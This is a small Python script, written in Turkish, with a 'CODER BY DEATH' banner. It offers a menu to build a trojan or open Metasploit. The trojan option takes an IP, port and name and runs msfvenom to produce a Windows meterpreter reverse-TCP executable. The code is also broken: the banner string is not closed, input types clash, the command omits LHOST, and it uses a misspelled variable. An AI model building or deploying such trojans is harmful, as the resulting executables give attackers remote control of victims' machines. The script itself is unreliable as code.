import os

os.system("clear")

banner=""" #########################################╔╗────────╔╗── /\︵-︵/\
               |( ◉)(◉)|
               \ ︶V︶ /
               /↺↺↺↺↺↺↺\
               ↺↺↺↺↺↺↺↺|
               \↺↺↺↺↺↺↺/
               ¯¯/\¯/\¯¯                                                                                                        
______   __  ____  _____    _  _____ _   _
| __ ) \ / / |  _ \| ____|  / \|_   _| | | |
|  _ \\ V /  | | | |  _|   / _ \ | | | |_| |
| |_) || |   | |_| | |___ / ___ \| | |  _  |
|____/ |_|   |____/|_____/_/   \_\_| |_| |_|                                      #
#
########################################

_______________________________________

         
        • CODER BY DEATH •


_______________________________________

#######################################

print(banner)

print("""
1)Trojan olusdur
2)Metasploiti ac""")
girdi=input("------->")
if (girdi==1):
        ip=raw_input("ip adresini giriniz----->")
        port=raw_input("portu giriniz------>")
        ismin=raw_input("trojan ismi------>")
        os.system("clear && msfvenom -p windows/meterpreter/reverse_TCP "+ip+" LPORT="+port+" -f exe -o "+isnin)
if (girdi==2):
        os.system("msfconsole")
        
